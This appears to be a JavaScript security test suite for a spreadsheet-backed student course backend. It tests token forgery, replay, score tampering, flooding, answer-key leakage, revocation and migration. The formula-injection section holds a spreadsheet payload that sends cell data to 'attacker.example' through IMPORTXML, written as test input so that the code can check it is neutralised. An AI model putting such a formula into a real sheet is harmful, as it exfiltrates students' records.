/* AAP101 backend security tests — runs the real Code.gs in the harness. */
const { makeRuntime } = require('./gas-harness');

let pass = 0, fail = 0;
const failures = [];
function ok(label, cond, extra) {
  if (cond) { pass++; console.log('  ✅ ' + label); }
  else { fail++; failures.push(label); console.log('  ❌ ' + label + (extra ? '  → ' + JSON.stringify(extra) : '')); }
}
function head(t) { console.log('\n── ' + t + ' ' + '─'.repeat(Math.max(0, 62 - t.length))); }

/* ── build a fresh database ── */
function fresh(nCodes) {
  const rt = makeRuntime();
  const g = rt.ctx;
  g.initSheet_(g.SH_CODES, g.CODES_HEADERS);
  g.initSheet_(g.SH_LOGIN, g.LOGIN_HEADERS);
  g.initSheet_(g.SH_ASSESS, g.ASSESS_HEADERS);
  g.initSheet_(g.SH_RUN, g.RUN_HEADERS);
  g.initSheet_(g.SH_EVENT, g.EVENT_HEADERS);
  g.initSheet_(g.SH_SEC, g.SEC_HEADERS);
  g.writeCodes_(g.sheet_(g.SH_CODES), nCodes || 3);
  return rt;
}
function codeAt(g, row) { return String(g.sheet_(g.SH_CODES).getRange(row, 1).getValue()); }
function rowOf(g, code) { return g.findCodeRow_(code); }
function recOf(g, code) {
  return g.sheet_(g.SH_CODES).getRange(rowOf(g, code), 1, 1, g.CODES_HEADERS.length).getValues()[0];
}
function col(g, code, name) { return recOf(g, code)[g.C[name] - 1]; }

/* A logged-in test student. */
function login(g, code, dev, name) {
  return g.apiLogin_({ code, deviceId: dev, name: name || 'Test Student',
                       section: 'TEST-1A', ua: 'Mozilla/5.0 Chrome/120', screen: '390x844' });
}

/* ═══════════════════════════════════════════════════════════════════════ */
head('LEGITIMATE STUDENT WORKFLOW (must keep working)');
{
  const rt = fresh(); const g = rt.ctx;
  const code = codeAt(g, 2), dev = 'dev-alpha';

  const chk = g.apiCheck_({ code, deviceId: dev });
  ok('T-L1 fresh code asks for registration', chk.ok === true && chk.stage === 'REGISTER', chk);

  const lg = login(g, code, dev);
  ok('T-L2 registration succeeds and returns a token', lg.ok === true && !!lg.token, lg);
  ok('T-L3 name and section are recorded', col(g, code, 'NAME') === 'Test Student' && col(g, code, 'SECTION') === 'TEST-1A');
  ok('T-L4 login returns authoritative state at zero', lg.state.xp === 0 && lg.state.progressPct === 0, lg.state);

  const chk2 = g.apiCheck_({ code, deviceId: dev });
  ok('T-L5 returning on the same device is let straight in', chk2.ok === true && chk2.stage === 'RETURNING', chk2);

  const auth = { code, token: lg.token, deviceId: dev };

  // correct single-answer quiz
  const q = g.apiGrade_(Object.assign({ gate: 'm5-kc', answer: 6 }, auth));
  ok('T-L6 a correct quiz answer is accepted', q.ok === true && q.correct === true, q);
  ok('T-L7 the server awards the key\'s XP (60)', q.xpAwarded === 60 && q.state.xp === 60, q.state);
  ok('T-L8 the gate is recorded server-side', q.state.gates.indexOf('m5-kc') >= 0, q.state.gates);

  // correct sorter
  const s = g.apiGrade_(Object.assign({ gate: 'm2-dnd',
    answer: { sunset: 'nature', banaue: 'art', 'ai-img': 'art', crush: 'nature' } }, auth));
  ok('T-L9 a correct sorter is accepted', s.ok === true && s.correct === true, s);
  ok('T-L10 perfect-first-try badge is awarded by the server', s.state.badges.indexOf('sorter') >= 0, s.state.badges);

  // correct multi-select
  const m = g.apiGrade_(Object.assign({ gate: 'm2-kc', answer: [4, 3] }, auth));
  ok('T-L11 multi-select accepts the right set in any order', m.correct === true, m);

  // claim-type gate
  const c = g.apiGrade_(Object.assign({ gate: 'm1-gal', answer: null }, auth));
  ok('T-L12 an exploration gate can be claimed', c.ok === true && c.correct === true && c.xpAwarded === 40, c);

  // boss round
  const bossAns = [0, 1, 2, 3, 0, 1, 2, 3].map((a, i) => ({ q: i, a }));
  const bo = g.apiGrade_(Object.assign({ gate: 'm5-boss', answer: bossAns }, auth));
  ok('T-L13 a perfect speed round clears and pays full XP', bo.correct === true && bo.xpAwarded === 120, bo);
  ok('T-L14 flawless-victory badge awarded', bo.state.badges.indexOf('perfect-boss') >= 0, bo.state.badges);
  ok('T-L15 the review is returned once the round is over', Array.isArray(bo.review) && bo.review.length === 8);

  const sy = g.apiSync_(Object.assign({ sid: 's-1', events: [
    { kind: 'runtime', event: 'session-start', minutes: 0, ts: new Date().toISOString() },
    { kind: 'page', detail: 'Lesson 1', value: 'm1', page: 'm1', ts: new Date().toISOString() }
  ], snapshot: { sessionMinutes: 3, lastPage: 'm1' } }, auth));
  ok('T-L16 sync accepts a normal batch', sy.ok === true && sy.received === 2, sy);
  ok('T-L17 dashboard XP matches server state', Number(col(g, code, 'XP')) === bo.state.xp, col(g, code, 'XP'));
  ok('T-L18 accuracy is computed server-side', Number(col(g, code, 'ACC')) === bo.state.accuracy);
  ok('T-L19 progress % is derived from cleared gates',
     Number(col(g, code, 'PROGRESS')) === Math.round(5 / g.allGates_().length * 100), col(g, code, 'PROGRESS'));
  ok('T-L20 study minutes recorded', Number(col(g, code, 'MINUTES')) > 0, col(g, code, 'MINUTES'));
}

/* ═══════════════════════════════════════════════════════════════════════ */
head('§23 ADVERSARIAL TESTS');
{
  const rt = fresh(); const g = rt.ctx;
  const codeA = codeAt(g, 2), devA = 'dev-attacker';
  const codeB = codeAt(g, 3), devB = 'dev-victim';
  const A = login(g, codeA, devA, 'Mallory Test');
  const B = login(g, codeB, devB, 'Victim Test');
  const authA = { code: codeA, token: A.token, deviceId: devA };
  rt.resetCache();

  // 1 — access with no credentials
  ok('T-01 grade with no token is refused',
     g.apiGrade_({ code: codeA, deviceId: devA, gate: 'm5-kc', answer: 6 }).ok === false);
  ok('T-01b sync with no token is refused',
     g.apiSync_({ code: codeA, deviceId: devA, events: [], snapshot: {} }).ok === false);

  // 2 — invalid code
  ok('T-02 an invented code is refused', g.apiCheck_({ code: 'AAP-ZZZZ-ZZZZ', deviceId: devA }).error === 'NOT_FOUND');

  // 3 — forged / tampered auth state
  ok('T-03 a made-up token is refused',
     g.apiGrade_({ code: codeA, token: 'totally.fake', deviceId: devA, gate: 'm5-kc', answer: 6 }).error === 'BAD_TOKEN');
  ok('T-03b a token with a flipped signature is refused',
     g.apiGrade_({ code: codeA, token: A.token.slice(0, -3) + 'AAA', deviceId: devA, gate: 'm5-kc', answer: 6 }).error === 'BAD_TOKEN');

  // 5 / 12 — someone else's student id
  ok('T-05 own token + another student\'s code is refused',
     g.apiGrade_({ code: codeB, token: A.token, deviceId: devA, gate: 'm5-kc', answer: 6 }).ok === false);
  ok('T-12 another student\'s code with own device is refused',
     g.apiSync_({ code: codeB, token: A.token, deviceId: devA, events: [], snapshot: {} }).error === 'DEVICE_LOCKED');
  ok('T-12b a valid token replayed from a different device is refused',
     g.apiGrade_({ code: codeA, token: A.token, deviceId: 'some-other-device', gate: 'm5-kc', answer: 6 }).ok === false);

  // 6 / 15 — unknown activity + unknown action
  ok('T-06 an invented activity id is refused',
     g.apiGrade_(Object.assign({ gate: 'FINAL_EXAM', answer: 1 }, authA)).error === 'UNKNOWN_ACTIVITY');
  ok('T-15 an unknown action is refused', g.route_({ action: 'dropDatabase' }).error === 'UNKNOWN_ACTION');
  ok('T-15b an action of the wrong type is refused', g.route_({ action: { evil: 1 } }).ok === false);

  // 7 / 8 / 9 / 10 — fabricated scores in the sync snapshot
  const before = { xp: Number(col(g, codeA, 'XP')), prog: Number(col(g, codeA, 'PROGRESS')) };
  const forged = g.apiSync_(Object.assign({ sid: 's-x', events: [], snapshot: {
    xp: 999999, level: 8, rank: 'Virtuoso', accuracy: 100, correct: 500, attempts: 500,
    bestStreak: 99, badgeCount: 15, badgeList: 'Full Scholar', lessonsDone: 10,
    progressPct: 100, activitiesDone: 99, sessionMinutes: 5
  } }, authA));
  ok('T-07 a fabricated XP snapshot is ignored', forged.ok === true && Number(col(g, codeA, 'XP')) === before.xp,
     { got: col(g, codeA, 'XP'), was: before.xp });
  ok('T-08 a fabricated accuracy is ignored', Number(col(g, codeA, 'ACC')) === 0, col(g, codeA, 'ACC'));
  ok('T-09 a fabricated completion status is ignored', Number(col(g, codeA, 'PROGRESS')) === before.prog);
  ok('T-10 a fabricated perfect score does not reach the sheet',
     Number(col(g, codeA, 'ACTS')) === 0 && String(col(g, codeA, 'BADGE_L')) === '');
  ok('T-10b a fabricated rank string is ignored', String(col(g, codeA, 'RANK')) === 'Apprentice', col(g, codeA, 'RANK'));

  // 11 — replay
  const first  = g.apiGrade_(Object.assign({ gate: 'm5-kc', answer: 6 }, authA));
  const second = g.apiGrade_(Object.assign({ gate: 'm5-kc', answer: 6 }, authA));
  const third  = g.apiGrade_(Object.assign({ gate: 'm5-kc', answer: 6 }, authA));
  ok('T-11 the first clear pays out', first.xpAwarded === 60);
  ok('T-11b a replayed submission pays nothing', second.xpAwarded === 0 && third.xpAwarded === 0,
     { second: second.xpAwarded, third: third.xpAwarded });
  ok('T-11c XP does not grow on replay', second.state.xp === first.state.xp && third.state.xp === first.state.xp);
  ok('T-11d a replayed claim gate pays nothing',
     g.apiGrade_(Object.assign({ gate: 'm1-gal', answer: null }, authA)).xpAwarded === 40 &&
     g.apiGrade_(Object.assign({ gate: 'm1-gal', answer: null }, authA)).xpAwarded === 0);

  // 13 — reading another student's record
  const leak = JSON.stringify([
    g.apiCheck_({ code: codeB, deviceId: devA }),
    g.apiLogin_({ code: codeB, deviceId: devA, name: 'Mallory' })
  ]);
  ok('T-13 no endpoint returns another student\'s name', leak.indexOf('Victim Test') < 0, leak.slice(0, 200));
  ok('T-13b login state is never returned for a code you do not hold',
     g.apiLogin_({ code: codeB, deviceId: devA, name: 'Mallory' }).state === undefined);

  // 14 — direct backend invocation via GET
  const xpBeforeGet = Number(col(g, codeA, 'XP'));
  const gres = JSON.parse(g.doGet({ parameter: {
    payload: JSON.stringify({ action: 'sync', code: codeA, token: A.token, deviceId: devA,
                              snapshot: { xp: 999999 } }),
    callback: 'evil' } })._t);
  ok('T-14 GET no longer routes actions', gres.service === 'AAP101' && gres.version === 2, gres);
  ok('T-14b GET cannot be turned into JSONP', typeof g.doGet({ parameter: { callback: 'evil' } })._t === 'string' &&
     g.doGet({ parameter: { callback: 'evil' } })._t.indexOf('evil(') < 0);
  ok('T-14c the GET payload did not reach the sheet', Number(col(g, codeA, 'XP')) === xpBeforeGet,
     { before: xpBeforeGet, after: col(g, codeA, 'XP') });

  // 16 / 17 — parameter and payload tampering
  const attemptsBeforeJunk = Number(col(g, codeA, 'ATTEMPTS'));
  ok('T-16 an out-of-range quiz answer is refused',
     g.apiGrade_(Object.assign({ gate: 'm5-kc', answer: 99 }, authA)).error === 'BAD_ANSWER');
  ok('T-16b a negative index is refused',
     g.apiGrade_(Object.assign({ gate: 'f4-kc', answer: -5 }, authA)).error === 'BAD_ANSWER');
  ok('T-16c a non-numeric answer is refused',
     g.apiGrade_(Object.assign({ gate: 'f4-kc', answer: { $gt: 0 } }, authA)).error === 'BAD_ANSWER');
  ok('T-16d a partly-filled sorter is refused',
     g.apiGrade_(Object.assign({ gate: 'm2-dnd', answer: { sunset: 'nature' } }, authA)).error === 'BAD_ANSWER');
  ok('T-16e a boss round with the wrong question count is refused',
     g.apiGrade_(Object.assign({ gate: 'm5-boss', answer: [{ q: 0, a: 0 }] }, authA)).error === 'BAD_ANSWER');
  ok('T-16f a boss round answering the same question 8 times is refused',
     g.apiGrade_(Object.assign({ gate: 'm5-boss',
       answer: Array(8).fill({ q: 0, a: 0 }) }, authA)).error === 'BAD_ANSWER');
  /* Six malformed submissions were just made. None of them may show up as an
     attempt, or a student could tank their own accuracy — or inflate it by
     spamming junk that the server quietly counts as a miss. */
  ok('T-16g six malformed answers added zero attempts',
     Number(col(g, codeA, 'ATTEMPTS')) === attemptsBeforeJunk,
     { before: attemptsBeforeJunk, after: col(g, codeA, 'ATTEMPTS') });

  // 17 — oversized payloads
  const flood = [];
  for (let i = 0; i < 5000; i++) flood.push({ kind: 'event', detail: 'x'.repeat(5000), ts: new Date().toISOString() });
  const rowsBefore = g.sheet_(g.SH_EVENT).getLastRow();
  const fl = g.apiSync_(Object.assign({ sid: 's-f', events: flood, snapshot: {} }, authA));
  const added = g.sheet_(g.SH_EVENT).getLastRow() - rowsBefore;
  ok('T-17 an event flood is capped', fl.ok === true && added <= g.MAX_EVENTS, { added, cap: g.MAX_EVENTS });
  ok('T-17b the dropped remainder is reported', fl.dropped === 5000 - g.MAX_EVENTS, fl.dropped);
  ok('T-17c oversized strings are truncated',
     String(g.sheet_(g.SH_EVENT).getRange(rowsBefore + 1, 6).getValue()).length <= g.MAX_FIELD);
  const big = g.doPost({ postData: { contents: 'x'.repeat(g.MAX_BODY + 10) } });
  ok('T-17d an oversized body is refused outright', JSON.parse(big._t).error === 'TOO_LARGE');

  // 18 — answer-key extraction
  const wrongSingle = g.apiGrade_(Object.assign({ gate: 'f4-kc', answer: 0 }, authA));
  const wrongMulti  = g.apiGrade_(Object.assign({ gate: 'm2-kc', answer: [0, 1] }, authA));
  const wrongSort   = g.apiGrade_(Object.assign({ gate: 'm4-dnd',
    answer: { potter: 'artist', painter: 'artisan', photographer: 'artisan', buntal: 'artist' } }, authA));
  /* Strip `state` first — it legitimately carries the student's own running
     totals, and a number in there can coincide with a key index. What matters
     is that the grading half of the reply never names the right answer. */
  function verdictOnly(r) { const c = Object.assign({}, r); delete c.state; return c; }
  const blob = JSON.stringify([verdictOnly(wrongSingle), verdictOnly(wrongMulti), verdictOnly(wrongSort)]);
  ok('T-18 a wrong single answer does not reveal the right one',
     wrongSingle.correct === false &&
     wrongSingle.key === undefined && wrongSingle.review === undefined &&
     JSON.stringify(verdictOnly(wrongSingle).wrong) === '[0]',   // only the student's own pick
     verdictOnly(wrongSingle));
  ok('T-18e the correct index (5) appears nowhere in the verdict',
     JSON.stringify(verdictOnly(wrongSingle)).indexOf('5') < 0, verdictOnly(wrongSingle));
  ok('T-18b a wrong multi answer returns only the student\'s own bad picks',
     JSON.stringify(wrongMulti.wrong) === '[0,1]' && wrongMulti.missedCount === 2, wrongMulti);
  ok('T-18c a wrong sorter names the misplaced tiles, not the right category',
     Array.isArray(wrongSort.wrong) && wrongSort.wrong.length === 4 &&
     blob.indexOf('artisan') === blob.lastIndexOf('artisan'), wrongSort.wrong);
  ok('T-18d a wrong answer earns no XP and clears no gate',
     wrongSingle.xpAwarded === 0 && wrongSingle.state.gates.indexOf('f4-kc') < 0);

  // 19 — teacher-only surface
  ok('T-19 no action exposes the code list', g.route_({ action: 'listCodes' }).ok === false);
  ok('T-19b no action exposes the answer key', g.route_({ action: 'getKey' }).ok === false);
  ok('T-19c ping leaks nothing', Object.keys(g.route_({ action: 'ping' })).join(',') === 'ok,service,time');
}

/* ═══════════════════════════════════════════════════════════════════════ */
head('SPREADSHEET FORMULA INJECTION (AAP-03)');
{
  const rt = fresh(); const g = rt.ctx;
  const code = codeAt(g, 2), dev = 'dev-inject';
  const evil = '=IMPORTXML("https://attacker.example/?d="&ENCODEURL(JOIN(",",A2:E50)),"//a")';

  const lg = login(g, code, dev, evil);
  const stored = String(col(g, code, 'NAME'));
  ok('T-INJ1 a formula name is stored as inert text', stored.charAt(0) === "'", stored.slice(0, 40));
  ok('T-INJ2 the payload is still readable for you to see', stored.indexOf('IMPORTXML') > 0);

  const auth = { code, token: lg.token, deviceId: dev };
  g.apiSync_(Object.assign({ sid: 's-i', events: [
    { kind: 'event', detail: '=HYPERLINK("http://evil","x")', value: '+1+1', page: '@SUM(A1)', ts: new Date().toISOString() }
  ], snapshot: { lastPage: '-1-1' } }, auth));

  const ev = g.sheet_(g.SH_EVENT);
  const r = ev.getLastRow();
  ok('T-INJ3 event detail is neutralised', String(ev.getRange(r, 6).getValue()).charAt(0) === "'");
  ok('T-INJ4 event value is neutralised', String(ev.getRange(r, 7).getValue()).charAt(0) === "'");
  ok('T-INJ5 event page is neutralised', String(ev.getRange(r, 8).getValue()).charAt(0) === "'");
  ok('T-INJ6 the snapshot lastPage is neutralised', String(col(g, code, 'LASTPAGE')).charAt(0) === "'",
     col(g, code, 'LASTPAGE'));
  ok('T-INJ7 an ordinary name is left completely alone',
     g.safeText_('Juan D. Dela Cruz') === 'Juan D. Dela Cruz');
  ok('T-INJ8 a hyphenated name is left alone', g.safeText_('Mary-Jane O’Brien') === 'Mary-Jane O’Brien');
  ok('T-INJ9 a section like "BSED-1A" survives', g.safeText_('BSED-1A') === 'BSED-1A');
}

/* ═══════════════════════════════════════════════════════════════════════ */
head('SESSION REVOCATION & DEVICE LOCK (AAP-07 / AAP-11)');
{
  const rt = fresh(); const g = rt.ctx;
  const code = codeAt(g, 2), dev = 'dev-rev';
  const lg = login(g, code, dev, 'Revoke Test');
  const auth = { code, token: lg.token, deviceId: dev };
  rt.resetCache();

  ok('T-REV1 the session works before revocation',
     g.apiGrade_(Object.assign({ gate: 'm1-gal', answer: null }, auth)).ok === true);

  const row = rowOf(g, code);
  g.sheet_(g.SH_CODES).getRange(row, g.C.STATUS).setValue('DISABLED');
  rt.resetCache();
  ok('T-REV2 disabling a code stops sync immediately',
     g.apiSync_(Object.assign({ sid: 's-r', events: [], snapshot: {} }, auth)).error === 'DISABLED');
  ok('T-REV3 disabling a code stops grading immediately',
     g.apiGrade_(Object.assign({ gate: 'm2-tabs', answer: null }, auth)).error === 'DISABLED');

  g.sheet_(g.SH_CODES).getRange(row, g.C.STATUS).setValue('ACTIVE');
  g.bumpEpoch_(row);
  rt.resetCache();
  ok('T-REV4 bumping the epoch invalidates the old token',
     g.apiGrade_(Object.assign({ gate: 'm2-tabs', answer: null }, auth)).error === 'BAD_TOKEN');

  const lg2 = login(g, code, dev, 'Revoke Test');
  ok('T-REV5 signing in again issues a working token',
     g.apiGrade_({ code, token: lg2.token, deviceId: dev, gate: 'm2-tabs', answer: null }).ok === true);

  // identity cannot be rewritten after a device release
  g.sheet_(g.SH_CODES).getRange(row, g.C.DEVICE).setValue('');
  const hijack = g.apiLogin_({ code, deviceId: 'dev-thief', name: 'Someone Else', section: 'XX' });
  ok('T-REV6 re-registering cannot rename the student',
     hijack.ok === true && col(g, code, 'NAME') === 'Revoke Test', col(g, code, 'NAME'));
}

/* ═══════════════════════════════════════════════════════════════════════ */
head('STUDY-TIME INFLATION (AAP-13) & RATE LIMIT (AAP-04)');
{
  const rt = fresh(); const g = rt.ctx;
  const code = codeAt(g, 2), dev = 'dev-time';
  const lg = login(g, code, dev, 'Time Test');
  const auth = { code, token: lg.token, deviceId: dev };

  g.apiSync_(Object.assign({ sid: 's-t', events: [], snapshot: { sessionMinutes: 1 } }, auth));
  const m1 = Number(col(g, code, 'MINUTES'));
  g.apiSync_(Object.assign({ sid: 's-t', events: [], snapshot: { sessionMinutes: 100000 } }, auth));
  const m2 = Number(col(g, code, 'MINUTES'));
  ok('T-TIME1 a 100000-minute claim is clamped to observed wall clock', m2 - m1 < 5, { m1, m2 });
  ok('T-TIME2 minutes are still accumulating normally', m2 >= m1);

  rt.resetCache();
  let limited = 0;
  for (let i = 0; i < g.RL_PER_MIN + 15; i++) {
    if (g.apiSync_(Object.assign({ sid: 's-t', events: [], snapshot: {} }, auth)).error === 'RATE_LIMIT') limited++;
  }
  ok('T-RATE1 a request flood is throttled', limited > 0, { limited });
  ok('T-RATE2 throttling kicks in near the configured budget', limited >= 10, { limited });
}

/* ═══════════════════════════════════════════════════════════════════════ */
head('MIGRATION — DATA PRESERVATION (§F)');
{
  const rt = makeRuntime(); const g = rt.ctx;
  /* An "old" database: original 24 columns only, with live student data. */
  const sh = g.initSheet_(g.SH_CODES, g.CODES_HEADERS.slice(0, 24));
  g.initSheet_(g.SH_ASSESS, g.ASSESS_HEADERS.slice(0, 12));
  const legacy = [
    ['AAP-AAAA-1111', 'ACTIVE', 'Ana Reyes', 'BSED-1A', 'dev-1', new Date('2026-06-01'), new Date('2026-07-01'),
     12, 340.5, 615, 4, 'Illustrator', 88, 44, 50, 7, 3, 'Sharp Eye, Clean Sort, Curator', 3, 61, 14, 'm5', 's-9', 12.5],
    ['AAP-BBBB-2222', 'ACTIVE', 'Ben Cruz', 'BSED-1B', 'dev-2', new Date('2026-06-02'), new Date('2026-07-02'),
     4, 90, 210, 2, 'Sketcher', 71, 15, 21, 4, 1, 'Sharp Eye', 1, 26, 6, 'm2', 's-4', 5],
    ['AAP-CCCC-3333', 'UNUSED', '', '', '', '', '', 0, 0, 0, '', '', '', 0, 0, '', '', '', '', '', '', '', '', '']
  ];
  sh.getRange(2, 1, legacy.length, 24).setValues(legacy);
  /* Normalise to strings up front — JSON round-tripping would silently turn
     the Date cells into strings on one side only and fake a difference. */
  const norm = v => (v && typeof v.getTime === 'function') ? 'D' + v.getTime() : String(v);
  const snapshotBefore = sh.getRange(2, 1, 3, 24).getValues().map(r => r.map(norm));

  /* Ana's real history, as the old build recorded it. */
  g.appendRows_(g.SH_ASSESS, [
    [new Date('2026-06-10'), 'AAPAAAA1111', 'Ana Reyes', 'BSED-1A', 'm1', 'm1-gal', 'polaroids', 'Studio Wall', 'COMPLETED', 1, 0, 's-1'],
    [new Date('2026-06-11'), 'AAPAAAA1111', 'Ana Reyes', 'BSED-1A', 'm2', 'm2-dnd', 'sorter', 'Sorting', 'COMPLETED', 1, 0, 's-1'],
    [new Date('2026-06-11'), 'AAPAAAA1111', 'Ana Reyes', 'BSED-1A', 'm2', 'm2-kc', 'quiz', 'False', 'COMPLETED', 2, 0, 's-1'],
    [new Date('2026-06-12'), 'AAPAAAA1111', 'Ana Reyes', 'BSED-1A', 'm2', 'm2-dnd', 'sorter', 'Sorting', 'WRONG', 1, 0, 's-2'],
    [new Date('2026-06-12'), 'AAPAAAA1111', 'Ana Reyes', 'BSED-1A', '', 'not-a-gate', 'x', '', 'COMPLETED', 1, 0, 's-2'],
    [new Date('2026-06-13'), 'AAPBBBB2222', 'Ben Cruz', 'BSED-1B', 'm1', 'm1-gal', 'polaroids', 'Studio Wall', 'COMPLETED', 1, 0, 's-3']
  ]);

  const msg = g.migrateSchema();
  ok('T-MIG1 migration reports success', /Upgrade complete/.test(msg));

  const after = sh.getRange(2, 1, 3, 24).getValues().map(r => r.map(norm));

  /* The upgrade deliberately restates the dashboard (columns 10–21) from
     rebuilt history. Everything else about a student — who they are, which
     device, when they first logged in, how many times, how long they studied —
     is a fact the server observed, and must survive untouched. */
  const REBUILT = [10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21];
  let untouchedOk = true, firstDiff = null;
  for (let r = 0; r < 3; r++) {
    for (let c = 0; c < 24; c++) {
      if (REBUILT.indexOf(c + 1) >= 0) continue;
      if (snapshotBefore[r][c] !== after[r][c]) {
        untouchedOk = false;
        firstDiff = { row: r + 2, col: c + 1, header: g.CODES_HEADERS[c],
                      was: snapshotBefore[r][c], now: after[r][c] };
      }
    }
  }
  ok('T-MIG2 identity, device, login and study-time columns are untouched', untouchedOk, firstDiff);
  ok('T-MIG2b the dashboard columns WERE restated from history',
     Number(sh.getRange(2, g.C.XP).getValue()) === 175 &&
     Number(sh.getRange(3, g.C.XP).getValue()) === 40,
     [sh.getRange(2, g.C.XP).getValue(), sh.getRange(3, g.C.XP).getValue()]);
  ok('T-MIG3 headers 1-24 are untouched',
     JSON.stringify(sh.getRange(1, 1, 1, 24).getValues()[0]) === JSON.stringify(g.CODES_HEADERS.slice(0, 24)));

  const ana = sh.getRange(2, 1, 1, g.CODES_HEADERS.length).getValues()[0];
  /* Ana's dashboard said 615 XP. Her history proves three activities worth
     40 + 60 + 75 = 175, so 175 is what she gets — the old figure was never
     checked by anything. */
  ok('T-MIG4 XP is rebuilt from history, not inherited',
     Number(ana[g.C.SXP - 1]) === 175, ana[g.C.SXP - 1]);
  ok('T-MIG5 her cleared gates were rebuilt from her own history',
     String(ana[g.C.SGATES - 1]) === 'm1-gal,m2-dnd,m2-kc', ana[g.C.SGATES - 1]);
  ok('T-MIG6 a WRONG row did not become a clear', String(ana[g.C.SGATES - 1]).split(',').length === 3);
  ok('T-MIG7 an unrecognised gate in history is dropped', String(ana[g.C.SGATES - 1]).indexOf('not-a-gate') < 0);
  ok('T-MIG8 the pre-upgrade dashboard is preserved',
     JSON.parse(String(ana[g.C.PREMIG - 1])).xp === 615 && JSON.parse(String(ana[g.C.PREMIG - 1])).progress === 61);
  /* Her dashboard claimed 44/50. Her history holds exactly one answer-level
     row — a WRONG on m2-dnd — so the rebuilt figures are 0 correct out of 1
     attempt. Nothing else in the history supports an attempt count. */
  ok('T-MIG9 correct/attempts are rebuilt, not carried over',
     Number(ana[g.C.SCORRECT - 1]) === 0 && Number(ana[g.C.SATTEMPTS - 1]) === 1,
     [ana[g.C.SCORRECT - 1], ana[g.C.SATTEMPTS - 1]]);
  ok('T-MIG10 every row got an epoch', Number(ana[g.C.EPOCH - 1]) === 1 &&
     Number(sh.getRange(4, g.C.EPOCH).getValue()) === 1);

  /* Idempotency */
  const msg2 = g.migrateSchema();
  ok('T-MIG11 re-running the migration rebuilds nothing new', /Rows rebuilt:\s+0/.test(msg2), msg2.split('\n')[2]);
  const anaAgain = sh.getRange(2, 1, 1, g.CODES_HEADERS.length).getValues()[0];
  ok('T-MIG12 a second run does not disturb the data',
     JSON.stringify(anaAgain) === JSON.stringify(ana));

  /* And a migrated student can carry straight on. */
  rt.resetCache();
  const lg = g.apiLogin_({ code: 'AAP-AAAA-1111', deviceId: 'dev-1', ua: 'Chrome' });
  ok('T-MIG13 a migrated student logs straight back in', lg.ok === true, lg);
  ok('T-MIG14 their progress comes back from the server',
     lg.state.xp === 175 && lg.state.gates.length === 3, lg.state);
  const gr = g.apiGrade_({ code: 'AAP-AAAA-1111', token: lg.token, deviceId: 'dev-1',
                           gate: 'm2-dnd', answer: { sunset: 'nature', banaue: 'art', 'ai-img': 'art', crush: 'nature' } });
  ok('T-MIG15 an already-cleared gate pays nothing after migration', gr.xpAwarded === 0 && gr.state.xp === 175, gr);
}

/* ═══════════════════════════════════════════════════════════════════════ */
head('MIGRATION DRY RUN (read-only)');
{
  /* Same "old" database shape as the migration test above. */
  function legacyDb() {
    const rt = makeRuntime(); const g = rt.ctx;
    const sh = g.initSheet_(g.SH_CODES, g.CODES_HEADERS.slice(0, 24));
    g.initSheet_(g.SH_ASSESS, g.ASSESS_HEADERS.slice(0, 12));
    sh.getRange(2, 1, 4, 24).setValues([
      /* Honest student. Dashboard 195 XP = the 175 her three clears are worth,
         plus a first-try bonus that reconstruction cannot prove but is within
         the allowance — so she must NOT be flagged. */
      ['AAP-AAAA-1111', 'ACTIVE', 'Ana Reyes', 'BSED-1A', 'dev-1', new Date('2026-06-01'), new Date('2026-07-01'),
       12, 340.5, 195, 2, 'Sketcher', 50, 1, 2, 1, 3, 'Sharp Eye', 1, 14, 3, 'm5', 's-9', 12.5],
      // claims 100% and 22 activities, history proves 1
      ['AAP-BBBB-2222', 'ACTIVE', 'Ben Cruz', 'BSED-1B', 'dev-2', new Date('2026-06-02'), new Date('2026-07-02'),
       4, 90, 99999, 8, 'Virtuoso', 100, 300, 200, 99, 15, 'Full Scholar', 12, 100, 22, 'f4', 's-4', 5],
      // a name that is a live formula, sitting in the sheet from before
      ['AAP-CCCC-3333', 'ACTIVE', '=IMPORTXML("https://x/","//a")', 'BSED-1C', 'dev-3', new Date('2026-06-03'),
       new Date('2026-07-03'), 2, 10, 40, 1, 'Apprentice', 100, 1, 1, 1, 0, '', 0, 4, 1, 'm1', 's-5', 2],
      // never claimed
      ['AAP-DDDD-4444', 'UNUSED', '', '', '', '', '', 0, 0, 0, '', '', '', 0, 0, '', '', '', '', '', '', '', '', '']
    ]);
    g.appendRows_(g.SH_ASSESS, [
      [new Date('2026-06-10'), 'AAPAAAA1111', 'Ana Reyes', 'BSED-1A', 'm1', 'm1-gal', 'polaroids', '', 'COMPLETED', 1, 0, 's-1'],
      [new Date('2026-06-11'), 'AAPAAAA1111', 'Ana Reyes', 'BSED-1A', 'm2', 'm2-dnd', 'sorter', '', 'COMPLETED', 1, 0, 's-1'],
      [new Date('2026-06-11'), 'AAPAAAA1111', 'Ana Reyes', 'BSED-1A', 'm2', 'm2-kc', 'quiz', '', 'COMPLETED', 2, 0, 's-1'],
      [new Date('2026-06-13'), 'AAPBBBB2222', 'Ben Cruz', 'BSED-1B', 'm1', 'm1-gal', 'polaroids', '', 'COMPLETED', 1, 0, 's-3'],
      [new Date('2026-06-13'), 'AAPCCCC3333', 'X', 'BSED-1C', 'm1', 'm1-gal', 'polaroids', '', 'COMPLETED', 1, 0, 's-5'],
      // Ana's answer-level rows, so her 1/2 dashboard figure is backed up
      [new Date('2026-06-11T08:00:00Z'), 'AAPAAAA1111', 'Ana Reyes', 'BSED-1A', 'm2', 'm2-dnd', 'sorter', '', 'WRONG', 1, 0, 's-1'],
      [new Date('2026-06-11T08:00:05Z'), 'AAPAAAA1111', 'Ana Reyes', 'BSED-1A', 'm2', 'm2-dnd', 'sorter', '', 'CORRECT', 2, 0, 's-1'],
      // an activity id the answer key has never heard of
      [new Date('2026-06-14'), 'AAPAAAA1111', 'Ana Reyes', 'BSED-1A', 'm9', 'm9-retired', 'quiz', '', 'COMPLETED', 1, 0, 's-1'],
      // history for a code that is not on the AccessCodes tab
      [new Date('2026-06-15'), 'AAPZZZZ9999', 'Ghost', '', 'm1', 'm1-gal', 'polaroids', '', 'COMPLETED', 1, 0, 's-8']
    ]);
    return rt;
  }

  /* ── it must not write ANYTHING ── */
  const rt = legacyDb(); const g = rt.ctx;
  function snapshotAll(rt) {
    const out = {};
    Object.keys(rt.sheets).forEach(n => {
      const s = rt.sheets[n];
      out[n] = JSON.stringify(s._cells.map(row => (row || []).map(
        v => (v && typeof v.getTime === 'function') ? 'D' + v.getTime() : String(v))));
    });
    return JSON.stringify(out);
  }
  const tabsBefore  = Object.keys(rt.sheets).sort().join(',');
  const cellsBefore = snapshotAll(rt);
